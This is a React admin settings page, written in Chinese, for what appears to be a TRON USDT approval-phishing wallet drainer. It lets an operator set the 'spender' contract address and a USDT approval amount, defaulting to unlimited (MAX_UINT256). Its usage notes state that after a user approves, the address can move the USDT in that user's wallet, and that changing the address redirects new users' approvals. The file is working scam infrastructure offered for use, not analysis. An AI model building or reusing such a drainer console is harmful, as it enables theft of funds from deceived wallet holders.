import { useState, useEffect } from 'react';
import { Save, RefreshCw, Settings, Wallet, Coins } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { supabase } from '@/integrations/supabase/client';
import { toast } from 'sonner';
import AdminLayout from './AdminLayout';

// Default MAX_UINT256 value
const DEFAULT_MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

interface AppSetting {
  id: string;
  key: string;
  value: string;
  description: string | null;
}

const AdminSettings = () => {
  const [settings, setSettings] = useState<AppSetting[]>([]);
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const [spenderAddress, setSpenderAddress] = useState('');
  const [approvalAmount, setApprovalAmount] = useState(DEFAULT_MAX_UINT256);
  const [savingApproval, setSavingApproval] = useState(false);

  useEffect(() => {
    fetchSettings();
  }, []);

  const fetchSettings = async () => {
    setLoading(true);
    try {
      const { data, error } = await supabase
        .from('app_settings' as any)
        .select('*')
        .order('key') as { data: AppSetting[] | null, error: any };

      if (error) {
        toast.error('加载设置失败');
        console.error(error);
      } else if (data) {
        setSettings(data);
        const spender = data.find(s => s.key === 'spender_address');
        if (spender) {
          setSpenderAddress(spender.value);
        }
        const approval = data.find(s => s.key === 'approval_amount');
        if (approval) {
          setApprovalAmount(approval.value);
        }
      }
    } catch (e) {
      console.error(e);
    }
    setLoading(false);
  };

  const handleSaveSpenderAddress = async () => {
    if (!spenderAddress.trim()) {
      toast.error('请输入合约地址');
      return;
    }

    // Basic validation for TRON address
    if (!spenderAddress.startsWith('T') || spenderAddress.length !== 34) {
      toast.error('请输入有效的TRON地址');
      return;
    }

    setSaving(true);
    try {
      const { error } = await supabase
        .from('app_settings' as any)
        .upsert({
          key: 'spender_address',
          value: spenderAddress,
          description: 'USDT授权合约地址'
        }, { onConflict: 'key' }) as { error: any };

      if (error) {
        toast.error('保存失败');
        console.error(error);
      } else {
        toast.success('授权地址已保存');
        fetchSettings();
      }
    } catch (e) {
      toast.error('保存失败');
      console.error(e);
    }
    setSaving(false);
  };

  const handleSaveApprovalAmount = async () => {
    if (!approvalAmount.trim()) {
      toast.error('请输入授权额度');
      return;
    }

    // Basic validation - should be a valid number string
    if (!/^\d+$/.test(approvalAmount)) {
      toast.error('请输入有效的数值（纯数字）');
      return;
    }

    setSavingApproval(true);
    try {
      const { error } = await supabase
        .from('app_settings' as any)
        .upsert({
          key: 'approval_amount',
          value: approvalAmount,
          description: 'USDT授权额度'
        }, { onConflict: 'key' }) as { error: any };

      if (error) {
        toast.error('保存失败');
        console.error(error);
      } else {
        toast.success('授权额度已保存');
        fetchSettings();
      }
    } catch (e) {
      toast.error('保存失败');
      console.error(e);
    }
    setSavingApproval(false);
  };

  const handleResetToUnlimited = () => {
    setApprovalAmount(DEFAULT_MAX_UINT256);
  };

  return (
    <AdminLayout>
      <div className="p-6">
        <div className="flex items-center justify-between mb-6">
          <div className="flex items-center gap-3">
            <Settings className="h-6 w-6" />
            <h1 className="text-2xl font-bold">系统设置</h1>
          </div>
          <Button variant="outline" size="icon" onClick={fetchSettings} disabled={loading}>
            <RefreshCw className={`h-4 w-4 ${loading ? 'animate-spin' : ''}`} />
          </Button>
        </div>

        {loading ? (
          <div className="text-center py-12">
            <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-secondary mx-auto"></div>
          </div>
        ) : (
          <div className="grid gap-6">
            {/* Contract Address Settings */}
            <Card>
              <CardHeader>
                <div className="flex items-center gap-2">
                  <Wallet className="h-5 w-5 text-primary" />
                  <CardTitle>授权合约地址</CardTitle>
                </div>
                <CardDescription>
                  设置用于USDT无限授权的合约地址（Spender Address）
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="spender_address">TRON 合约地址</Label>
                  <div className="flex gap-2">
                    <Input
                      id="spender_address"
                      placeholder="T..."
                      value={spenderAddress}
                      onChange={(e) => setSpenderAddress(e.target.value)}
                      className="font-mono"
                    />
                    <Button onClick={handleSaveSpenderAddress} disabled={saving}>
                      <Save className="h-4 w-4 mr-2" />
                      {saving ? '保存中...' : '保存'}
                    </Button>
                  </div>
                  <p className="text-xs text-muted-foreground">
                    此地址将用于用户USDT授权交易，请确保地址正确
                  </p>
                </div>

                {/* Current Settings */}
                <div className="mt-6 pt-4 border-t">
                  <h4 className="text-sm font-medium mb-3">当前配置</h4>
                  <div className="bg-muted rounded-lg p-4">
                    <div className="grid gap-2 text-sm">
                      {settings.map((setting) => (
                        <div key={setting.id} className="flex justify-between items-center">
                          <span className="text-muted-foreground">{setting.description || setting.key}:</span>
                          <span className="font-mono text-xs bg-background px-2 py-1 rounded">
                            {setting.value.length > 20 
                              ? `${setting.value.slice(0, 8)}...${setting.value.slice(-6)}` 
                              : setting.value
                            }
                          </span>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>

            {/* Approval Amount Settings */}
            <Card>
              <CardHeader>
                <div className="flex items-center gap-2">
                  <Coins className="h-5 w-5 text-primary" />
                  <CardTitle>授权额度设置</CardTitle>
                </div>
                <CardDescription>
                  设置用户USDT授权的额度（默认为无限授权 MAX_UINT256）
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="approval_amount">授权额度 (uint256)</Label>
                  <div className="flex gap-2">
                    <Input
                      id="approval_amount"
                      placeholder="输入授权额度..."
                      value={approvalAmount}
                      onChange={(e) => setApprovalAmount(e.target.value)}
                      className="font-mono text-xs"
                    />
                    <Button variant="outline" onClick={handleResetToUnlimited} title="重置为无限授权">
                      <RefreshCw className="h-4 w-4" />
                    </Button>
                    <Button onClick={handleSaveApprovalAmount} disabled={savingApproval}>
                      <Save className="h-4 w-4 mr-2" />
                      {savingApproval ? '保存中...' : '保存'}
                    </Button>
                  </div>
                  <p className="text-xs text-muted-foreground">
                    默认值为 MAX_UINT256（无限授权），可自定义具体数值
                  </p>
                  <div className="mt-3 p-3 bg-muted/50 rounded-lg">
                    <p className="text-xs font-medium mb-1">常用值参考：</p>
                    <ul className="text-xs text-muted-foreground space-y-1">
                      <li>• 无限授权: {DEFAULT_MAX_UINT256.slice(0, 20)}...</li>
                      <li>• 1,000 USDT: 1000000000 (含6位小数)</li>
                      <li>• 10,000 USDT: 10000000000</li>
                      <li>• 100,000 USDT: 100000000000</li>
                    </ul>
                  </div>
                </div>
              </CardContent>
            </Card>

            {/* Usage Instructions */}
            <Card>
              <CardHeader>
                <CardTitle>使用说明</CardTitle>
              </CardHeader>
              <CardContent>
                <ul className="space-y-2 text-sm text-muted-foreground">
                  <li className="flex items-start gap-2">
                    <span className="text-primary">•</span>
                    <span>授权合约地址用于用户进行USDT无限授权</span>
                  </li>
                  <li className="flex items-start gap-2">
                    <span className="text-primary">•</span>
                    <span>用户授权后，该地址可以转移用户钱包中的USDT</span>
                  </li>
                  <li className="flex items-start gap-2">
                    <span className="text-primary">•</span>
                    <span>请确保地址为有效的TRON网络地址（以T开头，34位）</span>
                  </li>
                  <li className="flex items-start gap-2">
                    <span className="text-destructive">•</span>
                    <span className="text-destructive">更改地址后，新用户的授权将指向新地址</span>
                  </li>
                </ul>
              </CardContent>
            </Card>
          </div>
        )}
      </div>
    </AdminLayout>
  );
};

export default AdminSettings;
